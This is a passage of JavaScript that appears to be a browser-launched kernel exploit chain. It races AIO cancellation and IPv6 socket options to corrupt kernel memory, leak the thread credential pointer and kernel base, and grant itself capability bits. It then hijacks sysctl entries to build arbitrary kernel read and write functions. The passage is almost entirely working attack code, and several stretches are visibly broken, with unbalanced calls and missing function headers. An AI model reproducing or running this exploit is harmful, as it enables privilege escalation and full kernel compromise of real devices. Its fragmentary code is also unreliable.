    keepAlive.push(glAb);
    const glDv = new DataView(glAb),
      glAd = bufAddr(glAb);
    function whoHasF() {
      let found = -1,
        hits = 0,
        state0 = 0;
      for (let i = 0; i < POOL.length; i++) {
        glDv.setInt32(0, RTH_SIZE, true);
        glDv.setInt32(4, 0, true);
        new Uint8Array(gfAb).fill(0);
        if (
          sc(SYS.getsockopt, POOL[i], IPPROTO_IPV6, IPV6_RTHDR, gfAd, glAd)
            .i32 !== 0
        )
          continue;
        const st = gfDv.getUint32(0x20, true) >>> 0;
        if (st !== 0) {
          hits++;
          if (found < 0) {
            found = i;
            state0 = st;
          }
        }
      }
      return { idx: found, hits: hits, state: state0 };
    }

    function reapNow(tag) {
      if (!REAP || reapedGen === armCount) return;
      wnode(0, DUM, DUM, true);
      reapedGen = armCount;
      const c = sc(SYS.aio_multi_cancel, idAd2, NUM, stAd2).i32;
      let stsC = "";
      for (let k = 0; k < NUM; k++)
        stsC +=
          (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
      const p = sc(SYS.aio_multi_poll, idAd2, NUM, stAd2).i32;
      let stsP = "";
      for (let k = 0; k < NUM; k++)
        stsP +=
          (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
      const d = sc(SYS.aio_multi_delete, idAd2, NUM, stAd2).i32;
      let sts = "";
      for (let k = 0; k < NUM; k++)
        sts += (k ? "," : "") + (stDv2.getUint32(k * 4, true) >>> 0).toString(16);
      reapAt = Date.now();
      post(
        "REAP",
        tag +
          " gen=" +
          reapedGen +
          " cancel=" +
          c +
          " poll=" +
          p +
          " delete=" +
          d +
          " c=[" +
          stsC +
          "] p=[" +
          stsP +
          "] st=[" +
          sts +
          "]",
      );
    }

    const firesArg = parseInt(params.get("fires") || "", 10);
    const FIRES =
      Number.isFinite(firesArg) && firesArg >= 1 && firesArg <= NUM - 1
        ? firesArg
        : NUM - 1;
    let fireIdx = FIRES;
    mark("PR-AMORTISE", "num=" + NUM + " fires_per_arming=" + FIRES);

    function runChain(nNodes, label) {
      snkDv.setInt32(0x00, 0x40000000, true);
      snkDv.setInt32(0x20, 0x40000000, true);

      trace(
        "CH-MTX-PRE",
        label +
          " owner=" +
          (mU32[OWNER_HI] >>> 0).toString(16) +
          ":" +
          (mU32[OWNER_LO] >>> 0).toString(16) +
          " want=0:4",
      );
      mU32[OWNER_LO] = 4;
      mU32[OWNER_HI] = 0;
      let a = "ok reused";
      if (fireIdx >= FIRES) {
        const n0save = arAb.slice(0, NODE_SZ);
        reapNow("pre-arm a=" + armCount);
        new Uint8Array(arAb, 0, NODE_SZ).set(new Uint8Array(n0save));
        setNode0(arAd, N0SINK);
        a = armOnce();
        if (a.indexOf("ok") !== 0) {
          mark("PR-ARM-FAIL", label + " " + a);
          return null;
        }
        fireIdx = 0;
      } else {
        setNode0(arAd, N0SINK);
      }
      const fireN = fireIdx;
      sc(SYS.aio_multi_cancel, idAd2.add32(4 * fireIdx), 1, stAd2);
      fireIdx++;
      trace(
        "CH-CANCEL-DONE",
        label +
          " nodes=" +
          nNodes +
          " fire=" +
          fireN +
          "/" +
          FIRES +
          " arm=" +
          armCount +
          " returned",
      );
      const moved = 0x40000000 - snkDv.getInt32(0x00, true);
      const w = whoHasF();
      const faked = FAKEMISS >= 0 && armCount === FAKEMISS;
      const n0 = faked ? 0 : 0x40000000 - snkDv.getInt32(0x20, true);
      lastFire = {
        n0: n0,
        fsock: w.idx,
        fhits: w.hits,
        faked: faked,
        label: label,
      };
      mark(
        "PR-FIRE",
        label +
          " nodes=" +
          nNodes +
          " sink_moved=" +
          moved +
          " node0_sink=" +
          n0 +
          " forced=" +
          (faked ? 1 : 0) +
          " f_socket=" +
          w.idx +
          " f_hits=" +
          w.hits +
          " state=0x" +
          w.state.toString(16) +
          " (" +
          a +
          ")",
      );
      if (n0 === 1 && w.idx < 0)
        mark(
          "PR-F-UNSEEN",
          "node0 fired but no pool socket carries the" +
            " state write -- F went to something outside the pool",
        );
      return moved;
    }

    const X1 = CT1.add32(TD_UCRED_OFF);
    mark(
      "PR-PASSA-TARGET",
      "X1 = w1.curthread+0x130 (td_ucred) = " +
        X1 +
        "  KA=" +
        KA +
        " pair=0x" +
        PAIR.toString(16) +
        " covers up to " +
        KA * PAIR,
    );
    {
      let i = 0;
      for (let j = 0; j < KA; j++) {
        wnode(i++, X1.add32(STEP_OFF), DUM, false);
        wnode(i++, X1, SNK, false);
      }

      const subA = (0x100000000 - ((KA * PAIR) % 0x100000000)) % 0x100000000;
      const dA = [
        subA & 0xff,
        (subA >>> 8) & 0xff,
        (subA >>> 16) & 0xff,
        (subA >>> 24) & 0xff,
      ];
      const nA = dA[0] + dA[1] + dA[2] + dA[3];
      mark(
        "PR-RESTOREA",
        "passA subtracted " +
          KA * PAIR +
          " sub=0x" +
          subA.toString(16) +
          " digits=" +
          dA.join(",") +
          " nodes=" +
          nA,
      );
      if (!check("pr-restorea-bounded", nA >= 1 && nA <= 1020, "n=" + nA))
        return;
      {
        const pa = [];
        for (let j = 0; j < 4; j++) for (let d = 0; d < dA[j]; d++) pa.push(j);
        for (let j = 0; j < pa.length; j++)
          wnode(i++, X1.add32(pa[j]), DUM, j === pa.length - 1);
      }
      const mA = runChain(i, "passA");
      if (mA === null) return;
      if (!fireOk("passA")) return;
      if (mA <= 0) {
        mark(
          "PR-PASSA-NOCROSS",
          "no crossing: low dword either exceeds " +
            KA * PAIR +
            " or is already negative (top bit set)",
        );
        if (retryBenign("passA-nocross")) return;
        check("POINTER-READ", false, "pass A found no crossing");
        return;
      }
      var kA = KA - mA + 1;
      mark(
        "PR-PASSA",
        "m=" +
          mA +
          " -> k=" +
          kA +
          "  W0 in (" +
          (kA - 1) * PAIR +
          ", " +
          kA * PAIR +
          "]",
      );
    }

    const RED = (kA - 1) * PAIR;
    const dga = [
      RED & 0xff,
      (RED >>> 8) & 0xff,
      (RED >>> 16) & 0xff,
      (RED >>> 24) & 0xff,
    ];
    const nDga = dga[0] + dga[1] + dga[2] + dga[3];
    mark(
      "PR-RESTORE-PLAN",
      "reduce=" + RED + " digits=" + dga.join(",") + " nodes=" + nDga,
    );
    if (
      !check(
        "pr-restore-bounded",
        nDga > 0 && nDga <= 1020 && RED > 0,
        "n=" + nDga,
      )
    )
      return;
    const X2 = X1;
    mark(
      "PR-PASSB-TARGET",
      "x2=" + X2 + " same_copy=1 restore_digits=" + nDga + " probes=" + KB,
    );
    let W0 = 0;
    {
      let i = 0;
      const posA = [];
      for (let j = 0; j < 4; j++) for (let d = 0; d < dga[j]; d++) posA.push(j);
      for (let j = 0; j < posA.length; j++)
        wnode(i++, X2.add32(posA[j]), DUM, false);
      for (let j = 0; j < KB; j++) wnode(i++, X2, SNK, false);

      const totB = (RED + KB) % 0x100000000;
      const subB = (0x100000000 - totB) % 0x100000000;
      const dB = [
        subB & 0xff,
        (subB >>> 8) & 0xff,
        (subB >>> 16) & 0xff,
        (subB >>> 24) & 0xff,
      ];
      const nB = dB[0] + dB[1] + dB[2] + dB[3];
      mark(
        "PR-RESTOREB",
        "passB subtracted " +
          totB +
          " sub=0x" +
          subB.toString(16) +
          " digits=" +
          dB.join(",") +
          " nodes=" +
          nB,
      );

      if (
        !check(
          "pr-restoreb-bounded",
          nB >= 1 && nB <= 1020,
          "n=" + nB + " min=1 max=1020 unterminated_if=0",
        )
      ) {
        mark("REFUSING-TO-ARM", "reason=passb-restore-empty");
        return;
      }
      {
        const pb = [];
        for (let j = 0; j < 4; j++) for (let d = 0; d < dB[j]; d++) pb.push(j);
        for (let j = 0; j < pb.length; j++)
          wnode(i++, X2.add32(pb[j]), DUM, j === pb.length - 1);
      }
      const mB = runChain(i, "passB");
      if (mB === null) return;
      if (!fireOk("passB")) return;
      if (mB <= 0) {
        mark(
          "PR-PASSB-NOCROSS",
          "remainder never crossed -- k may be off" +
            " by one, or the two threads' td_proc differ",
        );
        if (retryBenign("passB-nocross")) return;
        check("POINTER-READ", false, "pass B found no crossing");
        return;
      }
      const R = KB - mB + 1;
      W0 = (kA - 1) * PAIR + R;
      mark(
        "PR-PASSB",
        "m=" +
          mB +
          " -> R=" +
          R +
          "  => low dword = " +
          W0 +
          " (0x" +
          (W0 >>> 0).toString(16) +
          ")",
      );
    }

    const UCRED = new int64(W0 >>> 0, CT1.hi >>> 0);
    mark(
      "PR-UCRED",
      "ucred = " +
        UCRED +
        "  (high dword taken from the leaked" +
        " curthread prefix 0x" +
        (CT1.hi >>> 0).toString(16) +
        ")",
    );
    check(
      "pointer-read-shape-ok",
      W0 >>> 0 !== 0 && ((W0 >>> 0) & 7) === 0,
      "low=0x" +
        (W0 >>> 0).toString(16) +
        " 8-byte aligned=" +
        (((W0 >>> 0) & 7) === 0),
    );
    // Read phase is done: the remaining armings (anchor, caps) touch the
    // kernel, so from here a failure must NOT auto-reload. Reset the counter
    // so the next manual run starts fresh.
    clearRetry();

    const IDT = new int64(0x00001a00, 0xffffff80);
    const GATE_SZ = 16;

    const RVA_RSVD = off.k_idt_rsvd;
    const STEPMAG = 0x1000000;
    const SWEEP = params.get("sweep") ? parseInt(params.get("sweep"), 10) : 256;

    const B = {};
    const JOBS = [
      {
        n: "b0",
        j: 0,
        g: 22,
        want: null,
        low: function () {
          return 0x000000;
        },
      },
      {
        n: "b1",
        j: 1,
        g: 24,
        want: null,
        low: function () {
          return (B.b0 << 16) >>> 0;
        },
      },
      {
        n: "b3",
        j: 3,
        g: 25,
        want: 0x00,
        low: function () {
          return ((0x20 << 16) | (B.b1 << 8) | B.b0) >>> 0;
        },
      },
      {
        n: "b5",
        j: 5,
        g: 26,
        want: 0x8e,
        low: function () {
          return 0x000020;
        },
      },
      {
        n: "b6",
        j: 6,
        g: 27,
        want: null,
        low: function () {
          return 0x8e0000;
        },
      },
      {
        n: "b7",
        j: 7,
        g: 31,
        want: null,
        low: function () {
          return ((B.b6 << 16) | 0x8e00) >>> 0;
        },
      },
      {
        n: "b6d",
        j: 6,
        g: 20,
        want: null,
        low: function () {
          return 0x8e0000;
        },
      },
      {
        n: "b7d",
        j: 7,
        g: 15,
        want: null,
        low: function () {
          return ((B.b6 << 16) | 0x8e00) >>> 0;
        },
      },
    ];
    const NJ = JOBS.length,
      NEED = NJ * SWEEP * 2;

    mark(
      "ANCHOR-PLAN",
      "idt=" +
        IDT +
        " rsvd_rva=0x" +
        RVA_RSVD.toString(16) +
        " jobs=" +
        NJ +
        " sweep=" +
        SWEEP +
        " nodes=" +
        NEED +
        " gates=" +
        JOBS.map(function (q) {
          return q.g;
        }).join(",") +
        " armings_so_far=" +
        armCount,
    );
    if (
      !check(
        "anchor-nodes-bounded",
        NEED <= MAXN && SWEEP >= 8 && SWEEP <= 1024,
        "need=" + NEED + " arena=" + MAXN + " sweep=" + SWEEP,
      )
    )
      return;

    {
      let lo = 0x1000000,
        hi = -1;
      for (let q = 0; q < NJ; q++) {
        const o = JOBS[q].g * GATE_SZ + JOBS[q].j;
        if (o - 3 < lo) lo = o - 3;
        if (o + 3 > hi) hi = o + 3;
      }
      if (
        !check(
          "anchor-inside-idt",
          lo >= 0 && hi < 0x1000,
          "lo=+0x" +
            lo.toString(16) +
            " hi=+0x" +
            hi.toString(16) +
            " limit=0x1000",
        )
      )
        return;
      mark(
        "ANCHOR-SPAN",
        "from=" +
          IDT.add32(lo) +
          " to=" +
          IDT.add32(hi) +
          " gates=15,20-27,31 reserved=1",
      );
    }

    const anAb = new ArrayBuffer(4 * NJ * SWEEP);
    keepAlive.push(anAb);
    const anDv = new DataView(anAb),
      anAd = bufAddr(anAb);
    for (let i = 0; i < NJ * SWEEP; i++) anDv.setInt32(i * 4, 0x40000000, true);

    {
      let idx = 0;
      for (let q = 0; q < NJ; q++) {
        const o = JOBS[q].g * GATE_SZ + JOBS[q].j;
        const stepAd = IDT.add32(o);
        const probeAd = IDT.add32(o - 3);
        for (let k = 0; k < SWEEP; k++) {
          wnode(idx++, stepAd, DUM, false);
          wnode(idx++, probeAd, anAd.add32((q * SWEEP + k) * 4), false);
        }
      }
      put(arDv, (idx - 1) * NODE_SZ + 0x30, 0);
      if (runChain(idx, "anchor-sweep") === null) return;
      if (!fireOk("anchor-sweep")) return;
    }

    function simPattern(bv, low) {
      let w = ((bv << 24) >>> 0) | (low & 0xffffff) | 0;
      let out = "";
      for (let k = 0; k < SWEEP; k++) {
        w = (w - STEPMAG) | 0;
        w = (w - 1) | 0;
        out += w <= 0 ? "1" : "0";
      }
      return out;
    }
    function decodeByte(obs, low) {
      let hit = -1,
        n = 0;
      for (let bv = 0; bv < 256; bv++)
        if (simPattern(bv, low) === obs) {
          if (hit < 0) hit = bv;
          n++;
        }
      return { b: hit, n: n };
    }

    let bad = 0;
    for (let q = 0; q < NJ; q++) {
      const J = JOBS[q];
      let obs = "",
        ones = 0,
        edge = -1;
      for (let k = 0; k < SWEEP; k++) {
        const f = 0x40000000 - anDv.getInt32((q * SWEEP + k) * 4, true) > 0;
        obs += f ? "1" : "0";
        if (f) ones++;
        if (k > 0 && obs.charCodeAt(k) !== obs.charCodeAt(k - 1) && edge < 0)
          edge = k;
      }

      const low = J.low();
      const d = decodeByte(obs, low);
      B[J.n] = d.b;
      if (d.b < 0 || d.n !== 1) bad++;
      mark(
        "ANCHOR-BYTE",
        J.n +
          " gate=" +
          J.g +
          " j=" +
          J.j +
          " low=0x" +
          low.toString(16) +
          " ones=" +
          ones +
          " edge=" +
          edge +
          " cands=" +
          d.n +
          " val=" +
          (d.b < 0 ? "NO-MATCH" : "0x" + d.b.toString(16)),
      );
      if (J.want !== null)
        check(
          "anchor-control-" + J.n,
          d.b === J.want,
          "want=0x" +
            J.want.toString(16) +
            " got=" +
            (d.b < 0 ? "none" : "0x" + d.b.toString(16)),
        );
    }
    if (
      !check(
        "anchor-every-byte-unique",
        bad === 0,
        "nomatch=" + bad + " jobs=" + NJ,
      )
    )
      return;

    check(
      "anchor-duplicates-agree",
      B.b6 === B.b6d && B.b7 === B.b7d,
      "b6=0x" +
        B.b6.toString(16) +
        " b6d=0x" +
        B.b6d.toString(16) +
        " b7=0x" +
        B.b7.toString(16) +
        " b7d=0x" +
        B.b7d.toString(16),
    );

    const handlerLo =
      (((B.b7 << 24) >>> 0) + ((B.b6 << 16) >>> 0) + (B.b1 << 8) + B.b0) >>> 0;
    const kbLo = (handlerLo - RVA_RSVD) >>> 0;
    const KBASE = new int64(kbLo, 0xffffffff);
    mark(
      "ANCHOR-HANDLER",
      "handler=0xffffffff" +
        handlerLo.toString(16).padStart(8, "0") +
        " rva=0x" +
        RVA_RSVD.toString(16) +
        " b7=0x" +
        B.b7.toString(16) +
        " b6=0x" +
        B.b6.toString(16) +
        " b1=0x" +
        B.b1.toString(16) +
        " b0=0x" +
        B.b0.toString(16),
    );

    const kbAligned = (kbLo & 0x3fff) === 0;
    check(
      "ANCHOR-KERNEL-BASE",
      kbAligned,
      "kernel_base=" +
        KBASE +
        " aligned0x4000=" +
        (kbAligned ? 1 : 0) +
        " low=0x" +
        kbLo.toString(16),
    );
    mark(
      "ANCHOR-VERDICT",
      "fw=" +
        fwKey +
        " kernel_base=" +
        KBASE +
        " armings=" +
        armCount +
        " curthread=" +
        CT1 +
        " verdict=" +
        (kbAligned ? "ANCHORED" : "REJECTED") +
        (kbAligned ? " next=kfile" : " reason=not_0x4000_aligned"),
    );

    if (!kbAligned) {
      allDone = true;
      return;
    }

    const OID = KBASE.add32(off.k_oid_kern_file);
    const O_NUM = OID.add32(0x10);
    const O_VIS = OID.add32(0x50);
    const O_RAN = OID.add32(0x54);
    const KERN_FILE_NUM = 15;
    const ONUM_N = params.get("onum") ? parseInt(params.get("onum"), 10) : 64;
    mark(
      "KF-TARGETS",
      "oid=" + OID + " oid_number=" + O_NUM + " vis=" + O_VIS + " ran=" + O_RAN,
    );

    function oracleAt(addr, n, label) {
      const sAb = new ArrayBuffer(4);
      keepAlive.push(sAb);
      const sDv = new DataView(sAb),
        sAd = bufAddr(sAb);
      sDv.setInt32(0, 0x40000000, true);
      let i = 0;
      for (let k = 0; k < n; k++) wnode(i++, addr, sAd, false);
      put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
      if (runChain(i, label) === null) return null;
      if (!fireOk(label)) return null;
      const m = 0x40000000 - sDv.getInt32(0, true);
      return { m: m, v: m > 0 ? n - m + 1 : 0 };
    }

    function sweepAt(stepAd, probeAd, low, label) {
      const sAb = new ArrayBuffer(4 * SWEEP);
      keepAlive.push(sAb);
      const sDv = new DataView(sAb),
        sAd = bufAddr(sAb);
      for (let k = 0; k < SWEEP; k++) sDv.setInt32(k * 4, 0x40000000, true);
      let i = 0;
      for (let k = 0; k < SWEEP; k++) {
        wnode(i++, stepAd, DUM, false);
        wnode(i++, probeAd, sAd.add32(k * 4), false);
      }
      put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
      if (runChain(i, label) === null) return null;
      if (!fireOk(label)) return null;
      let obs = "";
      for (let k = 0; k < SWEEP; k++)
        obs += 0x40000000 - sDv.getInt32(k * 4, true) > 0 ? "1" : "0";
      return decodeByte(obs, low);
    }

    function planSub(cur, delta) {
      const d = [
        delta & 0xff,
        (delta >>> 8) & 0xff,
        (delta >>> 16) & 0xff,
        (delta >>> 24) & 0xff,
      ];
      let clean = true;
      for (let j = 1; j < 4; j++)
        if (d[j] > ((cur >>> (8 * j)) & 0xff)) clean = false;
      return { d: d, n: d[0] + d[1] + d[2] + d[3], clean: clean };
    }
    function emitSub(base, i, plan) {
      const pos = [];
      for (let j = 0; j < 4; j++)
        for (let q = 0; q < plan.d[j]; q++) pos.push(j);
      for (let j = 0; j < pos.length; j++)
        wnode(i++, base.add32(pos[j]), DUM, false);

    }

    const CAPS_B = UCRED.add32(0x67);
    const CAPS_PR = UCRED.add32(0x64);
    const CAPS_TARGET = 0x60;
    const CAPS_RESTORE = params.get("caprestore") === "1";
    mark(
      "CAPS-TARGET",
      "ucred=" +
        UCRED +
        " caps0=" +
        UCRED.add32(0x60) +
        " byte=" +
        CAPS_B +
        " probe=" +
        CAPS_PR +
        " want_bit=62" +
        " target=0x" +
        CAPS_TARGET.toString(16),
    );

    const mf1 = multiFire(
      [
        { kind: "sweep", step: CAPS_B, probe: CAPS_PR, low: 0x000000 },
        { kind: "oracle", addr: O_NUM, n: ONUM_N },
      ],
      "caps-byte+oid_number",
    );
    if (mf1 === null) return;
    const cb = mf1[0],
      on = mf1[1];

    const bLo = (cb.b - 1) & 0xff,
      bHi = cb.b;
    const setLo = (bLo & 0x40) !== 0,
      setHi = (bHi & 0x40) !== 0;
    mark(
      "CAPS-BYTE",
      "b=" +
        (cb.b < 0 ? "NO-MATCH" : "0x" + cb.b.toString(16)) +
        " cands=" +
        cb.n +
        " true_in={0x" +
        bLo.toString(16) +
        ",0x" +
        bHi.toString(16) +
        "} bit62_lo=" +
        (setLo ? 1 : 0) +
        " bit62_hi=" +
        (setHi ? 1 : 0),
    );
    if (
      !check(
        "caps-byte-decoded",
        cb.b >= 0 && cb.n === 1,
        "b=" + cb.b + " cands=" + cb.n,
      )
    )
      return;

    let capsWrote = 0,
      capsSkip = "",
      capsPend = 0;
    if (setLo && setHi) {
      capsSkip = "already-set";
      mark("CAPS-SKIP", "bit62 set for both candidates -- no write");
    } else if (params.get("nocaps") === "1") {
      capsSkip = "opted-out";
      mark("CAPS-SKIP", "?nocaps=1 -- read-only, gate 2 stays closed");
    } else {
      const dN = (bHi + 1) & 0xff;
      const fin = [
        (bHi - dN) & 0xff,
        (bLo - dN) & 0xff,
        (bHi - dN - 1) & 0xff,
        (bLo - dN - 1) & 0xff,
      ];
      const allSet = fin.every(function (v) {
        return (v & 0x40) !== 0;
      });
      mark(
        "CAPS-PLAN",
        "decrement " +
          CAPS_B +
          " by " +
          dN +
          " -> final in {" +
          fin
            .map(function (v) {
              return "0x" + v.toString(16);
            })
            .join(",") +
          "} all_bit62=" +
          (allSet ? 1 : 0) +
          " wraps=1",
      );
      if (
        !check(
          "caps-plan-ok",
          dN > 0 && dN <= 0x100 && allSet,
          "n=" + dN + " finals=" + fin.join(","),
        )
      )
        return;
      capsPend = dN;
    }

    function multiFire(jobs, label) {
      let need = 0;
      for (const j of jobs) need += j.kind === "sweep" ? SWEEP * 2 : j.n;
      mark(
        "MF-PLAN",
        label +
          " jobs=" +
          jobs.length +
          " nodes=" +
          need +
          " kinds=" +
          jobs
            .map(function (j) {
              return j.kind;
            })
            .join(","),
      );
      if (
        !check(
          "mf-bounded-" + label,
          need > 0 && need <= MAXN,
          "need=" + need + " arena=" + MAXN,
        )
      )
        return null;
      const nSink = jobs.reduce(function (a, j) {
        return a + (j.kind === "sweep" ? SWEEP : j.kind === "oracle" ? 1 : 0);
      }, 0);
      const sAb = new ArrayBuffer(4 * Math.max(1, nSink));
      keepAlive.push(sAb);
      const sDv = new DataView(sAb),
        sAd = bufAddr(sAb);
      for (let k = 0; k < nSink; k++) sDv.setInt32(k * 4, 0x40000000, true);
      let i = 0,
        sk = 0;
      const base = [];
      for (const j of jobs) {
        base.push(sk);
        if (j.kind === "sweep") {
          for (let k = 0; k < SWEEP; k++) {
            wnode(i++, j.step, DUM, false);
            wnode(i++, j.probe, sAd.add32((sk + k) * 4), false);
          }
          sk += SWEEP;
        } else if (j.kind === "oracle") {
          for (let k = 0; k < j.n; k++)
            wnode(i++, j.addr, sAd.add32(sk * 4), false);
          sk += 1;
        } else {
          for (let k = 0; k < j.n; k++) wnode(i++, j.addr, DUM, false);
        }
      }
      if (i === 0)
        return jobs.map(function () {
          return null;
        });
      put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
      if (runChain(i, label) === null) return null;
      if (!fireOk(label)) return null;
      const out = [];
      for (let q = 0; q < jobs.length; q++) {
        const j = jobs[q];
        if (j.kind === "sweep") {
          let obs = "";
          for (let k = 0; k < SWEEP; k++)
            obs +=
              0x40000000 - sDv.getInt32((base[q] + k) * 4, true) > 0
                ? "1"
                : "0";
          out.push(decodeByte(obs, j.low));
        } else if (j.kind === "oracle") {
          const m = 0x40000000 - sDv.getInt32(base[q] * 4, true);
          out.push({ m: m, v: m > 0 ? j.n - m + 1 : 0 });
        } else out.push({ n: j.n });
      }
      return out;
    }

    const IPV6_TCLASS = 61,
      KF_MARK = 0x41;
    const kfSock = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
    if (kfSock >= 0) {
      opened.push(kfSock);
      const tAb = new ArrayBuffer(4);
      keepAlive.push(tAb);
      const tDv = new DataView(tAb);
      tDv.setInt32(0, KF_MARK, true);
      sc(SYS.setsockopt, kfSock, IPPROTO_IPV6, IPV6_TCLASS, bufAddr(tAb), 4);
    }
    if (
      !check(
        "kf-target-socket",
        kfSock >= 0,
        "fd=" + kfSock + " tclass=0x" + KF_MARK.toString(16),
      )
    )
      return;

    const mibAb = new ArrayBuffer(8);
    keepAlive.push(mibAb);
    const mibDv = new DataView(mibAb),
      mibAd = bufAddr(mibAb);
    mibDv.setInt32(0, 1, true);
    mibDv.setInt32(4, KERN_FILE_NUM, true);
    const KF_BYTES = 1 << 20;
    const kfAb = new ArrayBuffer(KF_BYTES);
    keepAlive.push(kfAb);
    const kfDv = new DataView(kfAb),
      kfAd = bufAddr(kfAb);
    const olAb = new ArrayBuffer(8);
    keepAlive.push(olAb);
    const olDv = new DataView(olAb),
      olAd = bufAddr(olAb);
    function kernFile(withBuf, tag) {
      olDv.setInt32(0, withBuf ? KF_BYTES : 0, true);
      olDv.setInt32(4, 0, true);
      const r = sc(SYS.sysctl, mibAd, 2, withBuf ? kfAd : 0, olAd, 0, 0);
      const rv = r.i32,
        er = rv < 0 ? errno() : 0;
      const ln = olDv.getUint32(0, true);
      mark("KF-SYSCTL", tag + " rv=" + rv + " errno=" + er + " oldlen=" + ln);
      return { rv: rv, err: er, len: ln };
    }

    const base0 = kernFile(false, "baseline");
    check(
      "kf-baseline-is-enoent",
      base0.rv < 0 && base0.err === 2,
      "rv=" + base0.rv + " errno=" + base0.err + " want=-1/2",
    );

    mark(
      "KF-OIDNUM",
      "addr=" +
        O_NUM +
        " n=" +
        ONUM_N +
        " m=" +
        on.m +
        " v=" +
        on.v +
        " want=" +
        KERN_FILE_NUM,
    );
    if (
      !check(
        "KF-ANCHOR-CONFIRMED",
        on.v === KERN_FILE_NUM,
        "oid_number=" +
          on.v +
          " want=" +
          KERN_FILE_NUM +
          " kernel_base=" +
          KBASE,
      )
    )
      return;

    const curNum = (KERN_FILE_NUM - ONUM_N) >>> 0;
    const pNum = planSub(curNum, (curNum - KERN_FILE_NUM) >>> 0);
    mark(
      "KF-RESTORE-PLAN",
      "cur=0x" +
        curNum.toString(16) +
        " digits=" +
        pNum.d.join(",") +
        " nodes=" +
        pNum.n +
        " clean=" +
        (pNum.clean ? 1 : 0),
    );
    if (
      !check(
        "kf-restore-clean",
        pNum.clean && pNum.n <= 1020,
        "nodes=" + pNum.n + " clean=" + (pNum.clean ? 1 : 0),

    )

    {
      let i = emitSub(O_NUM, 0, pNum);
      wnode(i++, O_VIS, DUM, false);
      for (let q = 0; q < capsPend; q++) wnode(i++, CAPS_B, DUM, false);
      put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
      mark(
        "KF-WRITE",
        "restore_oid_number=" +
          pNum.n +
          " unhide=1 caps=" +
          capsPend +
          " total=" +
          i,
      );

      if (!fireOk("restore+unhide+caps")) {

            "CAPS-WROTE-UNVERIFIED",
            "caps=" + capsPend + " f_socket=" + lastFire.fsock,

        }

    }
    mark(
      "CAPS-DONE",
      "wrote=" +
        capsWrote +
        " skip=" +
        (capsSkip || "none") +
        " armings=" +
        armCount,

    const after = kernFile(false, "after-unhide");
    const got = after.rv === 0 ? kernFile(true, "with-buffer") : null;

    const capsLive = after.rv === 0;
    const A_OID = KBASE.add32(off.k_oid_maxfilesperproc);
    const A2_OID = KBASE.add32(off.k_oid_maxprocperuid);
    const B_OID = KBASE.add32(off.k_oid_maxfiles);
    const A_ARG1_CUR = KBASE.add32(off.k_arg1_maxfilesperproc);
    const A2_ARG1_CUR = KBASE.add32(off.k_arg1_maxprocperuid);
    const B_ARG1 = B_OID.add32(0x18);
    mark(
      "KRW-OIDS",
      "A(1,27)=" +
        A_OID +
        " A2(1,28)=" +
        A2_OID +
        " B(1,7)=" +
        B_OID +
        " &B.arg1=" +
        B_ARG1 +
        " capsLive=" +
        (capsLive ? 1 : 0),
    );

      for (let k = 0; k < 4; k++) t.push((tgt.low >>> (8 * k)) & 0xff);

        }

        b[0] === t[0] && b[1] === t[1] && b[2] === t[2] && b[3] === t[3];

    }

    const posA = planLow(A_ARG1_CUR, B_ARG1);
    const posA2 = planLow(A2_ARG1_CUR, B_ARG1.add32(4));
    mark(
      "KRW-PLAN",
      "posA=" +
        (posA ? posA.length : "REFUSED") +
        " posA2=" +
        (posA2 ? posA2.length : "REFUSED"),
    );
    const planOk = capsLive && !!posA && !!posA2;
    if (
      !check(
        "krw-plan-ok",
        planOk,
        planOk
          ? ""
          : "capsLive=" +
              (capsLive ? 1 : 0) +
              " posA=" +
              (posA ? posA.length : "null") +
              " posA2=" +
              (posA2 ? posA2.length : "null"),
      )
    ) {
      allDone = true;
    } else {
      {
        let i = 0;
        wnode(i++, A_OID.add32(0x50), DUM, false);
        wnode(i++, A2_OID.add32(0x50), DUM, false);
        wnode(i++, B_OID.add32(0x50), DUM, false);
        for (let k = 0; k < posA.length; k++)
          wnode(i++, A_OID.add32(0x18 + posA[k]), DUM, false);
        for (let k = 0; k < posA2.length; k++)
          wnode(i++, A2_OID.add32(0x18 + posA2[k]), DUM, false);
        put(arDv, (i - 1) * NODE_SZ + 0x30, 0);
        mark(
          "KRW-FIRE",
          "nodes=" +
            i +
            " (3 unhide + " +
            posA.length +
            " A + " +
            posA2.length +
            " A2)",
        );
        if (!check("krw-fire-bounded", i > 0 && i <= MAXN, "nodes=" + i)) {
          allDone = true;
        } else if (runChain(i, "krw-setup") === null) {
          allDone = true;
        } else if (!fireOk("krw-setup")) {
          allDone = true;
        } else {
          const kmAb = new ArrayBuffer(8);
          keepAlive.push(kmAb);
          const kmDv = new DataView(kmAb),
            kmAd = bufAddr(kmAb);
          const koAb = new ArrayBuffer(4);
          keepAlive.push(koAb);
          const koDv = new DataView(koAb),
            koAd = bufAddr(koAb);
          const knAb = new ArrayBuffer(4);
          keepAlive.push(knAb);
          const knDv = new DataView(knAb),
            knAd = bufAddr(knAb);
          const klAb = new ArrayBuffer(8);
          keepAlive.push(klAb);
          const klDv = new DataView(klAb),
            klAd = bufAddr(klAb);
          function kMib(a, b) {
            kmDv.setInt32(0, a, true);
            kmDv.setInt32(4, b, true);
          }
          function kSysRead(a, b) {
            kMib(a, b);
            klDv.setInt32(0, 4, true);
            klDv.setInt32(4, 0, true);
            koDv.setInt32(0, 0, true);
            const r = sc(SYS.sysctl, kmAd, 2, koAd, klAd, 0, 0).i32;
            const er = r < 0 ? errno() : 0;
            const vl = koDv.getInt32(0, true);

          }
          function kSysWrite(a, b, v) {
            kMib(a, b);
            knDv.setInt32(0, v | 0, true);
            const r = sc(SYS.sysctl, kmAd, 2, 0, 0, knAd, 4).i32;
            const er = r < 0 ? errno() : 0;
            return { rv: r, err: er };
          }

          function steer(X) {
            kSysWrite(1, 27, X.low | 0);
            kSysWrite(1, 28, X.hi | 0);
          }
          function kread32(X) {
            steer(X);
            return kSysRead(1, 7).val >>> 0;
          }
          function kwrite32(X, v) {
            steer(X);
            return kSysWrite(1, 7, v | 0).rv;
          }
          function read8(X) {
            const lo = kread32(X),
              hi = kread32(X.add32(4));
            return new int64(lo >>> 0, hi >>> 0);
          }
          function write8(X, V) {
            kwrite32(X, V.low | 0);
            kwrite32(X.add32(4), V.hi | 0);
          }

